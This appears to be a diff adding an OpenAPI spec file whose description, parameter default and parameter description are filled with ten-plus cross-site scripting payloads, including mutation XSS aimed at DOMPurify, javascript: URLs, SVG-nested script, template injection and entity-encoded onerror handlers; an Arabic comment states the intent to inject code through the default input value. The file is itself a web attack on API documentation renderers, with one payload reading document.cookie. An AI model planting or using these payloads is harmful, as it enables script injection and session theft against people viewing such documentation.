@@ -1,0 +1,50 @@
+openapi: "3.0.0"
+info:
+  title: "Bypassing Sanitizers: 10 XSS Vectors"
+  version: "1.0.0"
+  description: |
+    ### 1. Prototype Pollution Style (Markdown Logic)
+    [Click Here](javascript://%0aalert(document.domain))
+
+    ### 2. Mutation XSS (mXSS) - Targeting DOMPurify
+    <math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>
+
+    ### 3. SVG ForeignObject (Nested HTML)
+    <svg><foreignObject><div xmlns="http://www.w3.org/1999/xhtml"><script>alert(2)</script></div></foreignObject></svg>
+
+    ### 4. Background Image Execution
+    <div style="width:100%;height:100px;background-image:url('javascript:alert(3)')">Hover or Load</div>
+
+    ### 5. Hidden Iframe with Local Context
+    <iframe src="javascript:alert(document.cookie)"></iframe>
+
+    ### 6. Template Injection (Vue/Angular style if present)
+    {{constructor.constructor('alert(4)')()}}
+
+    ### 7. HTML5 Tag Bypassing (Autofocus)
+    <input autofocus onfocus="alert(5)">
+
+    ### 8. Encoding Trick (HTML Entities)
+    <img src=q onerror="&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x36;&#x29;">
+
+    ### 9. Video/Audio Source Injection
+    <video><source onerror="alert(7)">
+
+    ### 10. Tag-Breaking (Closing early)
+    "><img src=x onerror=alert(8)> <b "
+
+paths:
+  /advanced-xss:
+    get:
+      summary: "Injection in Parameters"
+      parameters:
+        - name: "payload"
+          in: "query"
+          schema:
+            type: "string"
+            # محاولة حقن الكود كقيمة افتراضية تظهر في خانة الإدخال
+            default: "<script>alert(9)</script>"
+          description: "Check if this triggers: <details/open/ontoggle=alert(10)>"
+      responses:
+        '200':
+          description: "OK"
